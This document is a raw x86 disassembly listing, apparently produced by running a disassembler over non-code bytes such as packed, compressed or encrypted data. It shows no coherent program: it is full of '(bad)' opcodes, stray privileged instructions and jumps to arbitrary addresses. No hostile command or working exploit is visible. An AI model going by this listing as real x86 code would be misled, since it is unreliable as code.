  421b5d:	sbb    dl,BYTE PTR [edi]
  421b5f:	test   eax,0x9540cea6
  421b64:	ret    
  421b65:	xchg   BYTE PTR [esi-0x4d],dl
  421b68:	dec    ebx
  421b69:	out    0x9f,eax
  421b6b:	push   0x1e
  421b6d:	sbb    ebp,edx
  421b6f:	outs   dx,DWORD PTR ds:[esi]
  421b70:	push   edi
  421b71:	in     eax,dx
  421b72:	call   0x2be41887
  421b77:	add    dh,BYTE PTR [edx+0x46]
  421b7a:	mov    ds:0x64710472,eax
  421b7f:	push   0x4d
  421b81:	int3   
  421b82:	sub    DWORD PTR [ecx],0xa13bd39d
  421b88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421b89:	pop    esi
  421b8a:	icebp  
  421b8b:	and    eax,0x7bb318c6
  421b90:	int3   
  421b91:	and    eax,0x3dd3540b
  421b96:	push   ss
  421b97:	push   ebx
  421b98:	repnz sub eax,0x5a4fd746
  421b9e:	sti    
  421b9f:	mov    ecx,0xf2da7c94
  421ba4:	xor    cl,BYTE PTR [ebp+0x5cbeab64]
  421baa:	int    0x9a
  421bac:	push   esi
  421bad:	sahf   
  421bae:	aas    
  421baf:	fist   DWORD PTR es:[esp+ebx*2-0x56044c3e]
  421bb7:	cld    
  421bb8:	loop   0x421b3c
  421bba:	hlt    
  421bbb:	fstp   DWORD PTR [ebx]
  421bbd:	ret    
  421bbe:	push   ebp
  421bbf:	(bad)  
  421bc0:	mov    ah,0x68
  421bc2:	in     al,dx
  421bc3:	jns    0x421b58
  421bc5:	jb     0x421c1b
  421bc7:	mov    al,0xd3
  421bc9:	sti    
  421bca:	or     eax,0x5c06889d
  421bcf:	mov    esi,0xffada3a
  421bd4:	xor    eax,0xef0eedc3
  421bd9:	cmp    al,0x79
  421bdb:	dec    ebp
  421bdc:	mov    ch,dh
  421bde:	adc    DWORD PTR ds:0x8c132c3,eax
  421be4:	push   0xd74a4629
  421be9:	test   al,0xf9
  421beb:	in     eax,0x98
  421bed:	cli    
  421bee:	mov    ebp,0xe1f8e1f9
  421bf3:	test   DWORD PTR [edx],edi
  421bf5:	xor    BYTE PTR [eax],0x5
  421bf8:	test   al,0x34
  421bfa:	shl    DWORD PTR [ebx+0x74234b9c],0x3
  421c01:	stos   BYTE PTR es:[edi],al
  421c02:	mov    ebp,0xf3db3dd5
  421c07:	adc    al,0x89
  421c09:	pusha  
  421c0a:	push   edi
  421c0b:	push   edx
  421c0c:	fcomp  QWORD PTR [edi-0x62813cd1]
  421c12:	xor    DWORD PTR [edx+0x5795eef3],esp
  421c18:	sub    eax,0xf3ada9e1
  421c1d:	inc    ebx
  421c1e:	lock aas 
  421c20:	cmovno edi,edi
  421c23:	push   es
  421c24:	(bad)  
  421c25:	and    DWORD PTR [ebx+esi*8+0x4e],edi
  421c29:	pop    ecx
  421c2a:	mov    eax,ds:0x13e8bc86
  421c2f:	cmp    BYTE PTR [ebx+0x36e5a16c],cl
  421c35:	test   ch,bl
  421c37:	pop    ss
  421c38:	pop    ebp
  421c39:	cmp    DWORD PTR [eax],ebp
  421c3b:	fstp   DWORD PTR [edx+0x6a]
  421c3e:	xchg   esi,eax
  421c3f:	fxch   st(6)
  421c41:	push   0x23aa4163
  421c46:	aas    
  421c47:	rcl    WORD PTR [eax+0x76870d],cl
  421c4e:	and    al,BYTE PTR [ecx-0x67af85e3]
  421c54:	add    ah,BYTE PTR ds:0xaa2ddd83
  421c5a:	and    bh,BYTE PTR [edx-0x72]
  421c5d:	sbb    al,0xdd
  421c5f:	icebp  
  421c60:	pop    ebx
  421c61:	in     al,0xdf
  421c63:	push   edi
  421c64:	pop    esp
  421c65:	xchg   ecx,eax
  421c66:	jo     0x421cb5
  421c68:	pop    ebp
  421c69:	daa    
  421c6a:	fmul   QWORD PTR [edi]
  421c6c:	aas    
  421c6d:	pop    es
  421c6e:	test   DWORD PTR [edx+0x7d],esi
  421c71:	inc    edx
  421c72:	jb     0x421ce1
  421c74:	mov    ds:0xbb2e245,eax
  421c79:	sub    BYTE PTR [edi],bh
  421c7b:	sbb    eax,0x2e20dd3f
  421c80:	mov    WORD PTR [esi],?
  421c82:	inc    esi
  421c83:	pshufw mm0,mm1,0x79
  421c87:	daa    
  421c88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421c89:	dec    esp
  421c8a:	cmovge edi,DWORD PTR [edi]
  421c8d:	push   0xffffffec
  421c8f:	push   esp
  421c90:	mov    esp,0xc1ddf420
	...
  421d11:	add    BYTE PTR [eax],al
  421d13:	add    BYTE PTR [ebx-0x62],ah
  421d16:	mov    esi,0xff63ff63
  421d1b:	sahf   
  421d1c:	and    eax,0x13989286
  421d21:	and    ecx,eax
  421d23:	fst    QWORD PTR [esi+0x690001b3]
  421d29:	pop    es
  421d2a:	add    BYTE PTR [eax],al
  421d2c:	(bad)  
  421d2d:	hlt    
  421d2e:	mov    esi,0xf1a1b3de
  421d33:	sbb    ebp,DWORD PTR [ebp-0x2dea8952]
  421d39:	loop   0x421cca
  421d3b:	push   es
  421d3c:	les    ebx,FWORD PTR [eax+0x97f5c15]
  421d42:	push   cs
  421d43:	lahf   
  421d44:	aam    0x1c
  421d46:	lods   eax,DWORD PTR ds:[esi]
  421d47:	(bad)  
  421d48:	retf   0x222b
  421d4b:	test   DWORD PTR [ebp+0x2],edx
  421d4e:	xor    ecx,DWORD PTR [edx-0x4cf63850]
  421d54:	push   0x622b68ae
  421d59:	xchg   edx,eax
  421d5a:	call   0x84679404
  421d5f:	cmp    eax,0xa7c5932a
  421d64:	xchg   esi,esp
  421d66:	addr16 xchg edx,eax
  421d68:	aas    
  421d69:	mov    BYTE PTR [ebx],dh
  421d6b:	jo     0x421d49
  421d6d:	in     al,dx
  421d6e:	rcl    BYTE PTR [eax-0x1c],0x26
  421d72:	mul    DWORD PTR [eax]
  421d74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421d75:	fldcw  WORD PTR [esi]
  421d77:	lea    ebx,[ecx]
  421d79:	xchg   ecx,eax
  421d7a:	fisub  DWORD PTR [edx]
  421d7c:	les    esp,FWORD PTR [edx]
  421d7e:	sbb    ecx,DWORD PTR [eax+0x31]
  421d81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421d82:	into   
  421d83:	scas   eax,DWORD PTR es:[edi]
  421d84:	add    eax,0x31cef90a
  421d89:	arpl   WORD PTR [esi-0x79],di
  421d8c:	or     bl,BYTE PTR [edx-0x771de4d]
  421d92:	(bad)  
  421d93:	jmp    0x421d96
  421d95:	jo     0x421db5
  421d97:	call   0xab4252ab
  421d9c:	xor    dh,dl
  421d9e:	pop    ecx
  421d9f:	cdq    
  421da0:	pushf  
  421da1:	loopne 0x421e18
  421da3:	add    al,0x97
  421da5:	clc    
  421da6:	mov    eax,ds:0x2a5cbc9c
  421dab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421dac:	mov    ebp,0x7868461f
  421db1:	push   0xffffffb8
  421db3:	mov    al,0x42
  421db5:	jb     0x421db3
  421db7:	(bad)  
  421db8:	and    eax,0xcf58af1f
  421dbd:	jg     0x421d54
  421dbf:	ret    0xf2df
  421dc2:	sbb    DWORD PTR [ecx+0x7fa52853],0xfdb7c3f2
  421dcc:	sub    dh,dl
  421dce:	adc    DWORD PTR [edx+edi*4+0x32140f9b],0x2097c5d0
  421dd9:	fmul   QWORD PTR [edx]
  421ddb:	mul    DWORD PTR [edi]
  421ddd:	xor    ah,BYTE PTR [ecx]
  421ddf:	add    eax,0x9643b509
  421de4:	js     0x421e06
  421de6:	xor    ch,BYTE PTR [ecx]
  421de8:	mov    edi,0x4e353107
  421ded:	dec    ebp
  421dee:	sbb    al,0xb6
  421df0:	or     al,0x5
  421df2:	mov    edi,0xb915eff0
  421df7:	inc    edx
  421df8:	into   
  421df9:	xchg   esi,eax
  421dfa:	fstp   DWORD PTR [edx]
  421dfc:	push   edx
  421dfd:	popa   
  421dfe:	sub    eax,0x19ce4571
  421e03:	adc    DWORD PTR [esi],0xffffffce
  421e06:	ins    DWORD PTR es:[edi],dx
  421e07:	or     edi,0x1f5ed9e1
  421e0d:	mov    ds:0xde831dac,al
  421e12:	sbb    eax,0xeaa8e76
  421e17:	push   es
  421e18:	pusha  
  421e19:	imul   esi,DWORD PTR [edx],0x7e
  421e1c:	je     0x421e69
  421e1e:	ins    BYTE PTR es:[edi],dx
  421e1f:	push   edi
  421e20:	mov    WORD PTR [esi+0x4befd6f5],ss
  421e26:	push   es
  421e27:	push   edx
  421e28:	cmp    dh,ah
  421e2a:	or     al,0xfd
  421e2c:	fisubr WORD PTR [ebx]
  421e2e:	sbb    al,0xce
  421e30:	or     edx,0x39
  421e33:	sub    ebx,ebx
  421e35:	gs sub al,0x65
  421e38:	mov    edi,0x873adf7a
  421e3d:	and    BYTE PTR [ecx],dl
  421e3f:	(bad)  
  421e40:	fcmovne st,st(6)
  421e42:	ret    0x2794
  421e45:	(bad)  
  421e46:	jmp    0x19158d7c
  421e4b:	adc    BYTE PTR [edi],ch
  421e4d:	push   ss
  421e4e:	inc    esi
  421e4f:	call   0x15290499
  421e54:	sahf   
  421e55:	xchg   ecx,eax
  421e56:	inc    ebx
  421e57:	mov    dh,0xc6
  421e59:	call   0xa68c:0x9b5c3c93
  421e60:	dec    esp
  421e61:	or     BYTE PTR [eax+0x61],cl
  421e64:	jl     0x421eb0
  421e66:	(bad)  
  421e67:	shl    DWORD PTR [eax+0x39],cl
  421e6a:	das    
  421e6b:	sub    eax,0x71625535
  421e70:	fmul   DWORD PTR [edx+0x6a]
  421e73:	cmp    DWORD PTR [esi],esi
  421e75:	rcr    DWORD PTR [ebx],cl
  421e77:	xchg   edi,eax
  421e78:	jno    0x421ea6
  421e7a:	pop    eax
  421e7b:	or     BYTE PTR [edi+0x6ea610f3],cl
  421e81:	cmp    cl,BYTE PTR [esi]
  421e83:	dec    ebp
  421e84:	and    al,0x6b
  421e86:	jl     0x421efa
  421e88:	mov    eax,ds:0x240feb11
  421e8d:	xchg   ebx,eax
  421e8e:	mov    ds:0xdc88e1e3,al
  421e93:	push   esi
  421e94:	(bad)  
  421e95:	sbb    eax,0x9131319a
  421e9a:	shl    BYTE PTR [esi+0xfa4a642],cl
  421ea0:	stos   DWORD PTR es:[edi],eax
  421ea1:	sbb    al,0x87
  421ea3:	hlt    
  421ea4:	push   esp
  421ea5:	push   ecx
  421ea6:	push   ds
  421ea7:	fcmovne st,st(1)
  421ea9:	mov    ds:0xcbf08038,al
  421eae:	outs   dx,DWORD PTR ds:[esi]
  421eaf:	mov    edx,0xf45a40c6
  421eb4:	mov    ebx,edi
  421eb6:	push   esp
  421eb7:	clc    
  421eb8:	test   DWORD PTR [edx+0x2d5a6499],esp
  421ebe:	aas    
  421ebf:	je     0x421f31
  421ec1:	dec    edx
  421ec2:	das    
  421ec3:	jp     0x421e7f
  421ec5:	sub    eax,0x63427773
  421eca:	push   ss
  421ecb:	into   
  421ecc:	pop    eax
  421ecd:	fwait
  421ece:	or     BYTE PTR [ebp-0x413d958f],cl
  421ed4:	adc    bh,BYTE PTR [eax-0x28]
  421ed7:	sub    ah,bl
  421ed9:	adc    eax,0x7dfafd25
  421ede:	shr    BYTE PTR [ecx-0x37],1
  421ee1:	ror    DWORD PTR [eax-0x7],1
  421ee4:	in     al,0x83
  421ee6:	mov    cl,0x49
  421ee8:	xor    BYTE PTR [edx+edx*2-0x6d],al
  421eec:	lods   eax,DWORD PTR ds:[esi]
  421eed:	inc    edx
  421eee:	mov    al,0xf4
  421ef0:	fistp  WORD PTR [edi]
  421ef2:	or     eax,edi
  421ef4:	iret   
  421ef5:	add    BYTE PTR [esi-0x6f],ah
  421ef8:	ret    
  421ef9:	inc    ecx
  421efa:	int    0x9c
  421efc:	xor    al,0xc4
  421efe:	ficom  DWORD PTR [ecx]
  421f00:	fwait
  421f01:	pop    esp
  421f02:	push   edx
  421f03:	into   
  421f04:	mov    bh,0x83
  421f06:	cmp    ch,BYTE PTR [edi+0x36]
  421f09:	lods   al,BYTE PTR ds:[esi]
  421f0a:	mov    esi,0x3f7665af
  421f0f:	loopne 0x421eba
  421f11:	(bad)  
  421f12:	jb     0x421eab
  421f14:	stos   DWORD PTR es:[edi],eax
  421f15:	aam    0x7f
  421f17:	push   ds
  421f18:	xchg   esi,eax
  421f19:	mov    al,0x22
  421f1b:	adc    DWORD PTR [ebx+ebp*8],esp
  421f1e:	das    
  421f1f:	pop    ebp
  421f20:	dec    edi
  421f21:	xchg   ebp,eax
  421f22:	cmc    
  421f23:	xchg   ecx,eax
  421f24:	mov    dh,0x8d
  421f26:	xchg   edi,eax
  421f28:	(bad)  
  421f29:	sbb    eax,0x94bf9e70
  421f2e:	gs xchg ecx,eax
  421f30:	rol    DWORD PTR [edi+0x33],cl
  421f33:	and    cl,BYTE PTR [ecx+eax*2+0x193b4572]
  421f3a:	outs   dx,DWORD PTR ds:[esi]
  421f3b:	in     al,0x12
  421f3d:	es jbe 0x421fab
  421f40:	sbb    BYTE PTR ds:0x205f8f2e,dh
  421f46:	mov    edi,0x9aeef06f
  421f4b:	mov    al,0xe1
  421f4d:	sar    BYTE PTR [esi],1
  421f4f:	loope  0x421f54
  421f51:	dec    ecx
  421f52:	pop    ds
  421f53:	popf   
  421f54:	xchg   BYTE PTR es:[edi+0x77c7f7a1],bl
  421f5b:	push   cs
  421f5c:	jne    0x421f48
  421f5e:	retf   0x3de9
  421f61:	xchg   ecx,eax
  421f62:	ds loop 0x421fbc
  421f65:	call   FWORD PTR [edx-0x3a68db2e]
  421f6b:	jnp    0x421f2a
  421f6d:	(bad)  
  421f6e:	sbb    eax,0x7fe298ea
  421f73:	rcr    BYTE PTR [ebx+0x516a0c28],cl
  421f79:	jnp    0x421fc5
  421f7b:	icebp  
  421f7c:	push   es
  421f7d:	push   ds
  421f7e:	pop    ebp
  421f7f:	stos   BYTE PTR es:[edi],al
  421f80:	outs   dx,BYTE PTR ds:[esi]
  421f81:	sub    DWORD PTR [ecx-0x3d],ebx
  421f84:	mov    WORD PTR [edx+0x4893aa50],cs
  421f8a:	and    edi,DWORD PTR [edi+0x27]
  421f8d:	(bad)  
  421f8e:	call   0x183c:0xfae20deb
  421f95:	lods   al,BYTE PTR ds:[esi]
  421f96:	jb     0x422005
  421f98:	loopne 0x421f40
  421f9a:	mov    esi,DWORD PTR [ecx+0x618f1ee7]
  421fa0:	out    0xc9,eax
  421fa2:	out    0x9f,al
  421fa4:	dec    ebp
  421fa5:	addr16 aam 0x6
  421fa8:	or     eax,0x185d84f9
  421fad:	or     ecx,ebp
  421faf:	jl     0x421fce
  421fb1:	(bad)  
  421fb2:	test   eax,0x2ea055b0
  421fb7:	int    0xff
  421fb9:	or     al,0x82
  421fbb:	(bad)  
  421fbc:	xchg   esi,eax
  421fbd:	popa   
  421fbe:	sub    al,0x2e
  421fc0:	mov    eax,0x8293b757
  421fc5:	adc    dl,BYTE PTR [edx+0x35]
  421fc8:	xchg   BYTE PTR [edx],cl
  421fca:	adc    al,0xfa
  421fcc:	pop    ss
  421fcd:	idiv   DWORD PTR [ebx-0x76]
  421fd0:	fsubr  st(2),st
  421fd2:	cld    
  421fd3:	jp     0x421fc7
  421fd5:	pop    ecx
  421fd6:	ins    BYTE PTR es:[edi],dx
  421fd7:	shl    BYTE PTR [ebx-0x457013d2],0xf4
  421fde:	sahf   
  421fdf:	cmp    esi,edx
  421fe1:	stc    
  421fe2:	inc    esi
  421fe3:	push   es
  421fe4:	jmp    0xd415:0x4a65
  421fea:	stos   DWORD PTR es:[edi],eax
  421feb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421fec:	arpl   WORD PTR [ebp+0x3],sp
  421fef:	outs   dx,BYTE PTR ds:[esi]
  421ff0:	gs (bad) 
  421ff2:	outs   dx,BYTE PTR ds:[esi]
  421ff3:	mov    ebx,0x8b3b9e5
  421ff8:	cld    
  421ff9:	mov    edi,0x76b18a34
  421ffe:	mov    eax,ds:0x598394d9
  422003:	mov    esp,0x37dada41
  422008:	das    
  422009:	out    dx,eax
  42200a:	leave  
  42200b:	mov    ds:0x76eae40e,eax
  422010:	lahf   
  422011:	lahf   
  422012:	arpl   WORD PTR [eax-0x638c42e2],ax
  422018:	test   al,0xe7
  42201a:	jb     0x422011
  42201c:	cwde   
  42201d:	sbb    al,0x33
  42201f:	jge    0x421fa4
  422021:	repz ja 0x42200c
  422024:	retf   0x8143
  422027:	and    eax,DWORD PTR [ebx]
  422029:	lock imul ebp,DWORD PTR [edx],0x820407fc
  422030:	mov    cl,0x29
  422032:	sti    
  422033:	sbb    bh,cl
  422035:	mov    eax,ds:0x7af22921
  42203a:	mov    ebx,0x9a401fef
  42203f:	sbb    bh,BYTE PTR [ecx-0x69ec7ab9]
  422045:	into   
  422046:	adc    BYTE PTR [ebx-0x78cbc597],0x59
  42204d:	dec    eax
  42204e:	daa    
  42204f:	aas    
  422050:	push   ecx
  422051:	cmovns ecx,edi
  422054:	(bad)  
  422055:	icebp  
  422056:	xchg   esi,eax
  422057:	and    edi,DWORD PTR [ecx]
  422059:	mov    ebp,ebx
  42205b:	sbb    DWORD PTR [ebx+0x78],eax
  42205e:	cmp    esi,DWORD PTR [edi+0x71]
  422061:	aad    0x7
  422063:	mov    ds:0xab121461,al
  422068:	iret   
  422069:	scas   eax,DWORD PTR es:[edi]
  42206a:	jae    0x422079
  42206c:	icebp  
  42206d:	sbb    eax,0xdc6f6af8
  422072:	out    dx,eax
  422073:	jnp    0x422041
  422075:	arpl   WORD PTR [ecx],si
  422077:	push   ds
  422078:	or     al,al
  42207a:	ds aaa 
  42207c:	ret    
  42207d:	mov    esp,DWORD PTR [ecx+ebp*4-0x6059bd9a]
  422084:	mov    edi,ebx
  422086:	not    DWORD PTR [edx+0x35]
  422089:	sbb    BYTE PTR [esi],0x8b
  42208c:	call   0xa02a:0x219ead7f
  422093:	(bad)  
  422094:	iret   
  422095:	add    DWORD PTR [ecx-0x3b147364],ebp
  42209b:	mov    edx,0x11b22b57
  4220a0:	sbb    al,0xd0
  4220a2:	cs ret 0x76a0
  4220a6:	lock dec DWORD PTR ds:0xcb18650a
  4220ad:	xchg   ebx,eax
  4220ae:	sub    ebx,esi
  4220b0:	mov    eax,edx
  4220b2:	jle    0x42206c
  4220b4:	addr16 xchg edx,eax
  4220b6:	dec    edx
  4220b7:	inc    ebp
  4220b8:	pop    edx
  4220b9:	jae    0x4220ed
  4220bb:	and    ch,BYTE PTR [esp+ebp*2+0x30e24609]
  4220c2:	cdq    
  4220c3:	xor    al,0xf5
  4220c5:	xchg   edx,eax
  4220c6:	jb     0x42208b
  4220c8:	lock jbe 0x422064
  4220cb:	fisttp QWORD PTR cs:[ebp+0x573413e6]
  4220d2:	jmp    0x422098
  4220d4:	les    ecx,FWORD PTR [esi]
  4220d6:	in     eax,0x8e
  4220d8:	fmul   st,st(5)
  4220da:	hlt    
  4220db:	and    al,0x70
  4220dd:	jns    0x4220ba
  4220df:	aaa    
  4220e0:	arpl   WORD PTR [ebp+0x13],bx
  4220e3:	test   al,0x15
  4220e5:	sti    
  4220e6:	pop    ds
  4220e7:	loop   0x42213f
  4220e9:	dec    edx
  4220ea:	(bad)  
  4220eb:	and    bl,ah
  4220ed:	out    dx,al
  4220ee:	jg     0x42212a
  4220f0:	cld    
  4220f1:	cmp    al,0xbf
  4220f3:	mov    DWORD PTR [ebp-0x5],edi
  4220f6:	ret    0xb005
  4220f9:	rcl    DWORD PTR [edx-0x6],1
  4220fc:	mov    eax,0xaaec0af5
  422101:	xor    al,0x35
  422103:	push   eax
  422104:	inc    esi
  422105:	sti    
  422106:	cmp    eax,0x6262ce0c
  42210b:	test   al,0xad
  42210d:	aad    0x7b
  42210f:	xchg   DWORD PTR [ecx],eax
  422111:	jmp    0xc8d7:0x58c35be8
  422118:	inc    ebp
  422119:	mov    eax,ds:0x31dd4843
  42211e:	out    dx,al
  42211f:	ret    
  422120:	xor    DWORD PTR [ebx-0x495cf220],ebp
  422126:	outs   dx,DWORD PTR ds:[esi]
  422127:	sar    BYTE PTR [ebp+ebp*2+0x31],0x37
  42212c:	add    eax,0xc20ce0ba
  422131:	imul   edx,ecx,0xdeafb5ce
  422137:	pop    esi
  422138:	repnz and ebx,DWORD PTR [eax-0x9]
  42213c:	mov    ch,0xee
  42213e:	mov    ch,0x7b
  422140:	ds (bad) 
  422142:	jmp    0x7308:0x6c521587
  422149:	in     eax,dx
  42214a:	out    0x11,al
  42214c:	jo     0x422138
  42214e:	aam    0xfb
  422150:	mov    esi,0xb340d15e
  422155:	sub    DWORD PTR [ebp+eax*2-0x13cd8937],edx
  42215c:	add    al,0x50
  42215e:	sub    BYTE PTR [ecx],dh
  422160:	leave  
  422161:	cld    
  422162:	cmp    ah,BYTE PTR [edx+ebp*2+0x64393e33]
  422169:	idiv   BYTE PTR [esi-0x43765f7e]
  42216f:	cmp    al,0xae
  422171:	xchg   esi,eax
  422172:	lock je 0x4221ad
  422175:	cdq    
  422176:	pop    eax
  422177:	es or  eax,ebp
  42217a:	fsubr  st,st(7)
  42217c:	adc    esi,DWORD PTR [edx+esi*1-0x254ab3bb]
  422183:	mov    edi,0xea71ce83
  422188:	std    
  422189:	adc    al,0x68
  42218b:	lahf   
  42218c:	lods   al,BYTE PTR ds:[si]
  42218e:	arpl   WORD PTR ds:0xa0650c98,di
  422194:	sbb    DWORD PTR [ebx-0x6683a537],edi
  42219a:	test   DWORD PTR [edx+0x1f525af5],0x596c8a33
  4221a4:	sbb    eax,0x965eb830
  4221a9:	outs   dx,DWORD PTR ds:[esi]
  4221aa:	inc    esi
  4221ab:	stc    
  4221ac:	jns    0x422206
  4221ae:	or     al,0x56
  4221b0:	xchg   ecx,eax
  4221b1:	xor    eax,0x561dd0b6
  4221b6:	pop    edi
  4221b7:	mov    dl,0xc
  4221b9:	lahf   
  4221ba:	adc    DWORD PTR [edi-0x60],esi
  4221bd:	fucompp 
  4221bf:	cdq    
  4221c0:	cmc    
  4221c1:	pop    ecx
  4221c2:	and    edi,esi
  4221c4:	pop    esp
  4221c5:	loop   0x422210
  4221c7:	mov    ?,WORD PTR [eax-0x8f81a97]
  4221cd:	jns    0x422160
  4221cf:	adc    esi,DWORD PTR [edx+0x1c760563]
  4221d5:	add    edi,DWORD PTR [ebx-0x78f61c0b]
  4221db:	and    al,0xf3
  4221dd:	push   cs
  4221de:	or     BYTE PTR [esi-0x36],0xf3
  4221e2:	(bad)  
  4221e3:	outs   dx,DWORD PTR ds:[esi]
  4221e4:	jg     0x4221ea
  4221e6:	add    eax,0xff29c96b
  4221eb:	lea    eax,[edi-0x1c948bbe]
  4221f1:	adc    DWORD PTR [ebx+0x56743039],eax
  4221f7:	mov    al,0x3f
  4221f9:	gs jg  0x42227a
  4221fc:	out    dx,eax
  4221fd:	sub    BYTE PTR [ebx+0x41],0xa7
  422201:	add    esi,DWORD PTR [edi-0x7fd30660]
  422207:	jbe    0x4221fd
  422209:	or     al,0xbf
  42220b:	mov    ch,0x4b
  42220d:	ins    BYTE PTR es:[edi],dx
  42220e:	push   cs
  42220f:	sub    al,cl
  422211:	xchg   esp,eax
  422212:	inc    esp
  422213:	stos   BYTE PTR es:[edi],al
  422214:	cmp    esp,esi
  422216:	add    DWORD PTR [ecx-0x63e97a4c],0x6b30fe3
  422220:	nop    ebp
  422223:	call   0x2049:0xa0d9244c
  42222a:	add    esp,eax
  42222c:	xor    ebx,eax
  42222e:	and    ebx,DWORD PTR [edi+0x38]
  422231:	mov    eax,ds:0xf75a38e5
  422236:	sub    DWORD PTR [ebp+edx*8-0x4a75c130],edi
  42223d:	mov    cl,0x91
  42223f:	pop    eax
  422240:	push   esi
  422241:	loop   0x42223d
  422243:	aam    0x8f
  422245:	add    eax,ebp
  422247:	mov    ds:0xd25b2044,eax
  42224c:	stos   DWORD PTR es:[edi],eax
  42224d:	(bad)  
  42224e:	mov    ebx,0x412c0297
  422253:	and    edi,eax
  422255:	pop    ebp
  422256:	inc    ebp
  422257:	xor    ebp,esi
  422259:	cdq    
  42225a:	dec    edi
  42225b:	stos   DWORD PTR es:[edi],eax
  42225c:	add    DWORD PTR [esi+0x2086c85f],edi
  422262:	mov    ebx,0xa1e044e0
  422267:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422268:	jns    0x4222d8
  42226a:	mov    esi,0x8d4d8b3b
  42226f:	mov    al,0x14
  422271:	adc    eax,0x675c9ae7
  422276:	mov    edx,0x8e7e8ee9
  42227b:	cmp    ecx,0x8
  42227e:	ins    DWORD PTR es:[edi],dx
  42227f:	clc    
  422280:	pushf  
  422281:	pop    ebx
  422282:	cmp    dl,ch
  422284:	aas    
  422285:	sub    eax,0xe8992ac0
  42228a:	adc    cl,BYTE PTR [eax-0x1f3c60e0]
  422290:	and    eax,0x9efedd25
  422295:	push   ds
  422296:	sub    bh,BYTE PTR [ebp+0x38]
  422299:	mov    ecx,edi
  42229b:	push   eax
  42229c:	and    dh,0x81
  42229f:	hlt    
  4222a0:	lds    edi,FWORD PTR [ebx+0x5b]
  4222a3:	add    DWORD PTR [edx-0x1868ec4e],ebx
  4222a9:	call   0x5bdd:0x4575ddc1
  4222b0:	mov    edi,0x8d81c7d1
  4222b5:	je     0x422286
  4222b7:	push   0xffffffe2
  4222b9:	mov    cl,0x55
  4222bb:	xor    DWORD PTR [edi+eiz*1],edi
  4222be:	in     al,0xac
  4222c0:	repnz repz xchg ebx,eax
  4222c4:	aam    0x0
  4222c6:	les    edx,FWORD PTR [esi+0x73a473a]
  4222cc:	rcl    dh,0x9a
  4222cf:	add    edx,DWORD PTR [esi-0x29]
  4222d2:	pop    esp
  4222d3:	xchg   esi,eax
  4222d4:	xor    BYTE PTR [ebp-0x1e],ch
  4222d7:	xor    DWORD PTR [ebx-0x55],0xc8114723
  4222de:	jg     0x4222f3
  4222e0:	jns    0x4222af
  4222e2:	(bad)  
  4222e3:	shl    BYTE PTR [ebx-0x53ed9932],cl
  4222e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4222ea:	dec    ebp
  4222eb:	outs   dx,BYTE PTR ds:[esi]
  4222ec:	std    
  4222ed:	ror    BYTE PTR ds:0x91d2fd38,1
  4222f3:	xchg   edi,eax
  4222f4:	pop    es
  4222f5:	dec    eax
  4222f6:	xor    al,bh
  4222f8:	div    DWORD PTR [ebp+0x3b]
  4222fb:	popw   ds
  4222fd:	jno    0x42234e
  4222ff:	and    DWORD PTR [edx+0x3c],0xe
  422303:	dec    edi
  422304:	lods   al,BYTE PTR ds:[esi]
  422305:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422306:	pshufw mm1,mm1,0xe1
  42230a:	push   esp
  42230b:	add    al,0x10
  42230d:	in     eax,0x29
  42230f:	shl    ch,cl
  422311:	sub    BYTE PTR [eax-0xe],ah
  422314:	(bad)  
  422316:	xchg   edx,eax
  422317:	sbb    eax,0xdf22822d
  42231c:	adc    edi,esp
  42231e:	gs pop edx
  422321:	cli    
  422322:	inc    eax
  422323:	jle    0x42238c
  422325:	push   es
  422326:	and    DWORD PTR [ecx],edi
  422328:	pop    esp
  422329:	xor    eax,0xbcb01ab5
  42232e:	aaa    
  42232f:	mov    esi,0x6b2a6a51
  422334:	stos   DWORD PTR es:[edi],eax
  422335:	mov    ds,WORD PTR [ecx]
  422337:	in     al,0x90
  422339:	jle    0x422399
  42233b:	jge    0x4222da
  42233d:	test   eax,0x91b037bd
  422342:	lds    ecx,FWORD PTR [edx+eax*4-0x71c41cdb]
  422349:	sub    eax,0xbed7eea9
  42234e:	push   ss
  42234f:	mov    eax,ds:0x2a89d58a
  422354:	mov    ah,0x1b
  422356:	add    bl,dl
  422358:	push   esi
  422359:	jb     0x422399
  42235b:	pop    ds
  42235c:	retf   
  42235d:	(bad)  
  42235e:	stos   DWORD PTR es:[edi],eax
  42235f:	dec    eax
  422360:	cs pop edi
  422362:	inc    ebx
  422363:	js     0x422350
  422365:	cdq    
  422366:	inc    esi
  422367:	jle    0x42239c
  422369:	and    eax,0x3ff92907
  42236e:	aaa    
  42236f:	xchg   esi,eax
  422370:	mov    dl,0x73
  422372:	test   al,0x56
  422374:	popf   
  422375:	jg     0x422326
  422377:	xor    al,0x32
  422379:	add    ebx,edi
  42237b:	dec    eax
  42237c:	out    dx,eax
  42237d:	test   eax,0xb2989554
  422382:	je     0x4223f6
  422384:	cmp    BYTE PTR [esi+0x22],ch
  422387:	cmp    ebx,DWORD PTR [edx]
  422389:	dec    ebx
  42238a:	mov    al,0x1d
  42238c:	push   cs
  42238d:	xchg   ebp,eax
  42238e:	xchg   esi,eax
  42238f:	mov    al,BYTE PTR [ebx+0x28]
  422392:	or     edx,esi
  422394:	add    DWORD PTR [edx-0x6a],edx
  422397:	inc    edx
  422398:	mov    ebx,0x58086cd6
  42239d:	xor    ecx,ebp
  42239f:	xchg   ebp,eax
  4223a0:	jmp    DWORD PTR ds:0xa703d2ee
  4223a6:	cwde   
  4223a7:	pop    ebp
  4223a8:	ds push ss
  4223aa:	mov    ah,BYTE PTR [edi]
  4223ac:	(bad)  
  4223ad:	mov    WORD PTR [ebp+0x3aaf1a89],fs
  4223b3:	inc    edx
  4223b4:	pusha  
  4223b5:	fdivr  st,st(1)
  4223b7:	sbb    BYTE PTR [edi],ch
  4223b9:	out    dx,eax
  4223ba:	xchg   ebx,eax
  4223bb:	xor    bl,BYTE PTR [edi]
  4223bd:	adc    ebp,ebx
  4223bf:	aad    0xff
  4223c1:	imul   edx,DWORD PTR [esi-0x24097a55],0x10
  4223c8:	or     DWORD PTR [ebp+0x229431a8],edx
  4223ce:	iret   
  4223cf:	and    ebx,DWORD PTR [eax]
